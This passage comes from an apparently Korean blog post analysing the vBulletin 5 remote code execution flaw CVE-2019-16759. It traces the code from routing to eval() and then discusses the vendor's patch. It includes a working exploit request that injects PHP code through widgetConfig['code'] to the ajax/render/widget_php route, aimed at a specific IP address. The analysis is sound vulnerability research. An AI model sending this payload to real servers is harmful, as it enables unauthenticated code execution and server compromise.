class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(ìƒëµ)</span><br></pre></td></tr></table></figure><p>ì·¨ì•½ì ì˜ ì‹œì‘ì€ index.phpì—ì„œ ì‹œì‘ì´ ë©ë‹ˆë‹¤. <code>isQuickRoute()</code>ì˜ ê°’ì´ ì°¸ì´ë©´ if ë¬¸ ë‚´ë¶€ë¡œ ë“¤ì–´ê°€ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. isQuickRoute ë©”ì„œë“œëŠ” <code>includes/vb5/frontend/applicationlight.php</code> ë‚´ë¶€ì— ì •ì˜ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(ìƒëµ)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Tells whether this class can process this request</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> boll</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">isQuickRoute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$quickRoutes</span>[<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]]))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>], <span class="number">0</span>, <span class="number">8</span>) == <span class="string">&#x27;ajax/api&#x27;</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>], <span class="number">0</span>, <span class="number">11</span>) == <span class="string">&#x27;ajax/render&#x27;</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(ìƒëµ)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>includes/vb5/frontend/applicationlight.php</code> ë‚´ë¶€ì—ëŠ” ìœ„ì™€ ê°™ì´ isQuickRoute ë©”ì„œë“œê°€ ì •ì˜ë˜ì–´ ìˆëŠ”ë° routestringì˜ ê°’ì´ <code>&#39;ajax/api&#39;</code>, <code>&#39;ajax/render&#39;</code>ì´ë©´ tureë¥¼ ë°˜í™˜í•´ vB5_Frontend_ApplicationLight::initê°€ ì‹¤í–‰ì´ ë©ë‹ˆë‹¤.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(ìƒëµ)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**Standard constructor. We only access application throuth init() **/</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring]))</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            return false;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if (isset(self::$quickRoutes[$_REQUEST[&#x27;</span>routestring<span class="string">&#x27;]]))</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = self::$quickRoutes[$_REQUEST[&#x27;</span>routestring]];</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring], 0, 8) == &#x27;</span>ajax/api<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = array(&#x27;</span>handler<span class="string">&#x27; =&gt; &#x27;</span>handleAjaxApi<span class="string">&#x27;, &#x27;</span><span class="built_in">static</span><span class="string">&#x27; =&gt; false);</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            if (substr($_REQUEST[&#x27;</span>routestring<span class="string">&#x27;], 0, 17) == &#x27;</span>ajax/api/cron/run<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                $this-&gt;application[&#x27;</span>runcron<span class="string">&#x27;] = true;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            return true;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if (substr($_REQUEST[&#x27;</span>routestring<span class="string">&#x27;], 0, 11) == &#x27;</span>ajax/render<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = array(&#x27;</span>handler<span class="string">&#x27; =&gt; &#x27;</span>callRender<span class="string">&#x27;, &#x27;</span><span class="built_in">static</span><span class="string">&#x27; =&gt; false);</span></span><br><span class="line"><span class="string">            return true;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        return false;  </span></span><br><span class="line"><span class="string">    &#125;    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(ìƒëµ)</span></span><br></pre></td></tr></table></figure><p>index.phpì—ì„œ vB5_Frontend_ApplicationLight::init ë©”ì„œë“œê°€ ì‹¤í–‰ë˜ë©´ ìœ„ <code>__construct</code> ë©”ì„œë“œê°€ ì‹¤í–‰ë©ë‹ˆë‹¤. ì½”ë“œ í•˜ë‹¨ì— ë³´ë©´ <code>routestring</code>ì˜ ê°’ì´ <code>&#39;ajax/render&#39;</code>ì´ë©´ handlerë¡œ callRender ë©”ì„œë“œê°€ ì„¤ì •ë˜ì–´ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. callRender ë©”ì„œë“œë„ <code>includes/vb5/frontend/applicationlight.php</code> ë‚´ë¶€ì— ì •ì˜ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(ìƒëµ)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** This renders a template from an ajax call</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">callRender</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$routeInfo</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (count(<span class="variable">$routeInfo</span>) &lt; <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> vB5_Exception_Api(<span class="string">&#x27;ajax&#x27;</span>, <span class="string">&#x27;api&#x27;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;invalid_request&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$params</span> = array_merge(<span class="variable">$_POST</span>, <span class="variable">$_GET</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(<span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&#x27;actionRender&#x27;</span>, <span class="string">&#x27;arguments&#x27;</span> =&gt; <span class="variable">$params</span>,</span><br><span class="line">            <span class="string">&#x27;template&#x27;</span> =&gt; <span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>));</span><br><span class="line">        Api_InterfaceAbstract::setLight();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sendAsJson(vB5_Template::staticRenderAjax(<span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="variable">$params</span>));</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">(ìƒëµ)</span><br></pre></td></tr></table></figure><p>callRender ë©”ì„œë“œë¥¼ ë³´ë©´ $routeInfoì— explode() ë©”ì„œë“œë¥¼ ì´ìš©í•´ì„œ <code>$_REQUEST[&#39;routestring&#39;]</code>ì˜ ê°’ì„ ìŠ¬ë˜ì‰¬ë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì˜ë¼ ë°°ì—´ë¡œ ë§Œë“¤ì–´ì£¼ê³ , $paramsì—ëŠ” array_merge ë©”ì„œë“œë¥¼ ì´ìš©í•´ì„œ Query String ê°’ê³¼ Raw Data ê°’ì„ í•©ì³ í•˜ë‚˜ì˜ ë°°ì—´ë¡œ ë§Œë“œëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br>ê·¸ë¦¬ê³  $routeInfo[2]ì˜ ê°’ê³¼ $paramsì˜ ê°’ì„ í…œí”Œë¦¿ìœ¼ë¡œ ì „ì†¡í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// core/install/vbulletin-style.xml</span><br><span class="line"></span><br><span class="line">(ìƒëµ)</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;widget_php&quot;</span> <span class="attr">templatetype</span>=<span class="string">&quot;template&quot;</span> <span class="attr">date</span>=<span class="string">&quot;1372889589&quot;</span> <span class="attr">username</span>=<span class="string">&quot;vBulletin Solutions&quot;</span> <span class="attr">version</span>=<span class="string">&quot;5.0.5 Release Canddate 1&quot;</span>&gt;</span>&lt;![CDATA[&lt;</span><br><span class="line">        vb:if condition=&quot;empty(widgetConfig) AND !empty($widgetinstaceid)&quot;&gt;</span><br><span class="line">    &#123;vb:data widgetConfig, widget, fetchConfig, (vb:raw widgetinstanceid)&#125;</span><br><span class="line">&lt;/vb:if&gt;</span><br><span class="line">&lt;vb:if condition=&quot;!empty($widgetConfig)&quot;&gt;</span><br><span class="line">    &#123;vb:set widgetid, &#123;vb:raw widgetConfig.widgetid&#125;&#125;</span><br><span class="line">    &#123;vb:set widgetinstanceid, &#123;vb:raw widgetConfig.widgetinstanceid&#125;&#125;</span><br><span class="line">&lt;/vb:if&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;canvax-widget default-widget custtom-html-widget&quot; data-widget-id=&quot;&#123;vb:raw widgetid&#125;&quot; data-widget-instance-id=&quot;&#123;vb:raw widgetinstanceid&#125;&quot;&gt;</span><br><span class="line">    &#123;vb:template module_title, widgetConfig=&#123;vb:raw widgetConfig&#125;, can_use_sitebuilder=&#123;vb:raw user.can_use_sitebuilder&#125;&#125;</span><br><span class="line">    &lt;div class=&quot;widget-header-divder&quot; /&gt;</span><br><span class="line">        &lt;hr class=&quot;widget-header-divider&quot; /&gt;</span><br><span class="line">        &lt;vb:if condition=&quot;!empty($widgetConfig[&#x27;code&#x27;]) AND !$vboptions[&#x27;disable_php_rendering&#x27;]&quot;&gt;</span><br><span class="line">            &#123;vb:action evaledPHP, bbcode, evalCode, &#123;vb:raw widgetConfig.code&#125;&#125;</span><br><span class="line">            &#123;vb:raw $evaledPHP&#125;</span><br><span class="line">        &lt;vb:else /&gt;</span><br><span class="line">            &lt;vb:if condition=&quot;$user[can_use_sitebuilder&#x27;]&quot;&gt;</span><br><span class="line">                &lt;span class=&quot;note&quot;&gt;&#123;vb:phrase click_edit_to_config_module&#125;&lt;/span&gt;</span><br><span class="line">            &lt;/vb:if&gt;</span><br><span class="line">        &lt;/vb:if&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;div&gt;]]&gt;<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line">(ìƒëµ)</span><br></pre></td></tr></table></figure><p>widget_php í…œí”Œë¦¿ì„ í™•ì¸í•´ë³´ë©´ <code>$widgetConfig[&#39;code&#39;]</code>ì˜ ê°’ì´ ë¹„ì–´ìˆì§€ ì•Šê³ , <code>!$vboptions[&#39;disable_php_rendering&#39;]</code>ê°€ ë¹„í™œì„±í™” ë˜ì–´ ìˆìœ¼ë©´ ë‹¤ìŒ ì½”ë“œë¥¼ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;vb:action evaledPHP, bbcode, evalCode, &#123;vb:raw widgetConfig.code&#125;&#125;</span><br><span class="line">&#123;vb:raw $evaledPHP&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/controller/bbcode.php</span></span><br><span class="line"></span><br><span class="line">(ìƒëµ)</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evalCode</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">(ìƒëµ)</span><br></pre></td></tr></table></figure><p>evalCode ë©”ì„œë“œëŠ” <code>includes/vb5/frontend/controller/bbcode.php</code> ë‚´ì— ì •ì˜í•˜ê³  ìˆê³ , eval í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ $code ê°’ì„ ì‹¤í–‰ì‹œí‚¤ê³ , <code>$output</code> ê°’ì„ ë¦¬í„´í•´ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ê²°ë¡ ì ìœ¼ë¡œ RCEë¥¼ íŠ¸ë¦¬ê±° í•˜ê¸° ìœ„í•´ì„œëŠ” <code>includes/vb5/frontend/applicationlight.php</code>ì—ì„œ <code>isQuickRoute</code> ë©”ì„œë“œì—ì„œ rotuestringì˜ ê°’ì´ â€˜ajax/renderâ€™ì—¬ì•¼ í•˜ê³ , callRenderì—ì„œ $routeInfo[2]ì˜ ê°’ì€ <code>&#39;widget_php&#39;</code>ì—¬ì•¼ í•˜ê³ , <code>widget_php</code> í…œí”Œë¦¿ì—ì„œëŠ” <code>$widgetConfig[&#39;code&#39;]</code>ì˜ ê°’ì´ ì¡´ì¬í•´ì•¼ í•˜ê³ , eval í•¨ìˆ˜ì˜ ì¸ì ê°’ìœ¼ë¡œë„ <code>$widgetConfig[&#39;code&#39;]</code>ê°€ ë“¤ì–´ê°‘ë‹ˆë‹¤.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$routeInfo</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]);</span><br><span class="line"><span class="variable">$params</span> = array_merge(<span class="variable">$_POST</span>, <span class="variable">$_GET</span>);</span><br><span class="line">print_r(<span class="variable">$routeInfo</span>);</span><br><span class="line">print_r(<span class="variable">$params</span>);</span><br><span class="line"></span><br><span class="line">input  : http:<span class="comment">//141.164.52.207/?routestring=ajax/render/widget_php&amp;widgetConfig[&#x27;code&#x27;]=phpinfo();</span></span><br><span class="line">output : <span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; ajax [<span class="number">1</span>] =&gt; render [<span class="number">2</span>] =&gt; widget_php ) <span class="keyword">Array</span> ( [routestring] =&gt; ajax/render/widget_php [widgetConfig] =&gt; <span class="keyword">Array</span> ( [<span class="string">&#x27;code&#x27;</span>] =&gt; phpinfo(); ) )</span><br></pre></td></tr></table></figure><p>ê·¸ë¦¬ê³  ì‚¬ìš©ì ê°’ì„ ë°›ì„ ë•Œ, <code>$_REQUEST</code>ë¥¼ ì´ìš©í•´ì„œ ë°›ì•„ ì˜¤ê¸° ë•Œë¬¸ì— GET, POST ë©”ì„œë“œë¥¼ ì´ìš©í•´ì„œ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‹ˆ GETìœ¼ë¡œ ìµìŠ¤ë¥¼ í•˜ë ¤ë©´ ìœ„ì™€ ê°™ì´ ê·¸ëƒ¥ ê°’ì„ ë„˜ê²¨ ì£¼ê²Œ ë˜ë©´ <code>substr($_REQUEST[&#39;routestring&#39;], 0, 11)</code>ì˜ ê°’ì´ <code>&#39;ajax/render&#39;</code>ì´ê¸° ë•Œë¬¸ì— ì°¸ì´ ë°˜í™˜ë˜ëŠ” ë™ì‹œì— <code>vB5_Frontend_ApplicationLight::init</code>ê°€ ì‹¤í–‰ ë¼ <code>__construct</code> ë©”ì„œë“œê°€ ì‹¤í–‰ì´ ë  ê²ƒì´ê³ , <code>__construct</code> ë©”ì„œë“œì—ì„œë„ <code>substr($_REQUEST[&#39;routestring&#39;], 0, 11)</code>ì˜ ê°’ì´ <code>&#39;ajax/render&#39;</code>ì´ê¸° ë•Œë¬¸ì— handlerë¥¼ callRenderë¡œ ì„¤ì •í•˜ê²Œ ë©ë‹ˆë‹¤. callRender ë©”ì„œë“œì—ì„œëŠ” routeInfo[2]ì˜ ê°’ìœ¼ë¡œëŠ” <code>&#39;widget_php&#39;</code>, widgetConfig[â€˜codeâ€™]ì˜ ê°’ìœ¼ë¡œëŠ” <code>&#39;phpinfo();&#39;</code>ê°€ ë“¤ì–´ê°€ ìˆì–´ 2ê°œì˜  <code>widget_php</code> í…œí”Œë¦¿ìœ¼ë¡œ ì „ì†¡ì´ ë©ë‹ˆë‹¤. <code>widget_php</code>ì—ì„œëŠ” widgetConfig[â€˜codeâ€™]ê°€ ë¹„ì–´ìˆì§€ ì•Šê¸° ë•Œë¬¸ì— evalCodeë¡œ widgetConfig[â€˜codeâ€™]ê°€ ì „ì†¡ì´ ë˜ì–´ phpinfo(); í•¨ìˆ˜ê°€ ì‹¤í–‰ì´ ë˜ë©° RCEê°€ ì„±ê³µì ìœ¼ë¡œ íŠ¸ë¦¬ê±° ë˜ê²Œ ë©ë‹ˆë‹¤.</p><hr><h2 id="CVE-2019-16759-Patch"><a href="#CVE-2019-16759-Patch" class="headerlink" title="CVE-2019-16759 Patch"></a>CVE-2019-16759 Patch</h2><p>CVE-2019-16759 ì·¨ì•½ì ì€ ì´ 2ê°œì˜ íŒ¨ì¹˜ê°€ ì´ë£¨ì–´ì¡Œë‹¤ê³  í•©ë‹ˆë‹¤.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *      Remove any problematic values from the template</span></span><br><span class="line"><span class="comment"> *      variable arrays before rendering</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//for now don&#x27;t pass the values through.  These arrays are potentially large</span></span><br><span class="line"><span class="comment">//and we don&#x27;t want to make unnecesary copies.  The alternative is to pass by</span></span><br><span class="line"><span class="comment">//reference which causes it&#x27;s own headaches.  It&#x27;s an internal function and the</span></span><br><span class="line"><span class="comment">//relevant arrays are all class variables.</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanRegistered</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">        <span class="variable">$disallowedNames</span> = <span class="keyword">array</span>(<span class="string">&#x27;widgetConfig&#x27;</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$disallowedNames</span> <span class="keyword">AS</span> <span class="variable">$name</span>)</span><br><span class="line">        &#123;   </span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;registered[<span class="variable">$name</span>]);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="built_in">self</span>::<span class="variable">$globalRegistered</span>[<span class="variable">$name</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì²«  íŒ¨ì¹˜ëŠ” <code>clearRegistered</code>ë¼ëŠ” í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ widgetConfigë¼ëŠ” ê°’ì´ ì‚¬ìš©ë˜ë©´ <code>unset()</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ ì œê±°í•˜ê³  ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‹ˆ Query String ì´ë‚˜ Raw Dataë¡œ <code>widgetConfig[&#39;code&#39;]=phpinfo();</code>ë¼ëŠ” ê°’ì´ ë“¤ì–´ì˜¤ê²Œ ë˜ë©´ widgetConfigê°€ ì¡´ì¬í•˜ê¸° ë•Œë¬¸ì— <code>unset()</code>ì— ì˜í•´ì„œ ì œê±°ê°€ ë  ê²ƒ ì…ë‹ˆë‹¤.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">diff -ur vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/frontend/applicationlight.php</span><br><span class="line">--- vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">31.356918994</span> <span class="number">-0500</span></span><br><span class="line">+++ vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/frontend/applicationlight.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">40.577517014</span> <span class="number">-0500</span></span><br><span class="line">@@ <span class="number">-286</span>,<span class="number">20</span> +<span class="number">286</span>,<span class="number">32</span> @@</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> vB5_Exception_Api(<span class="string">&#x27;ajax&#x27;</span>, <span class="string">&#x27;render&#x27;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;invalid_request&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">-<span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(</span><br><span class="line">-<span class="string">&#x27;action&#x27;</span>          =&gt; <span class="string">&#x27;actionRender&#x27;</span>,</span><br><span class="line">-<span class="string">&#x27;arguments&#x27;</span>       =&gt; <span class="variable">$serverData</span>,</span><br><span class="line">-<span class="string">&#x27;template&#x27;</span>        =&gt; <span class="variable">$routeInfo</span>[<span class="number">2</span>],</span><br><span class="line">-<span class="comment">// this use of $_GET appears to be fine,</span></span><br><span class="line">-<span class="comment">// since it&#x27;s setting the route query params</span></span><br><span class="line">-<span class="comment">// not sending the data to the template</span></span><br><span class="line">-<span class="comment">// render</span></span><br><span class="line">-<span 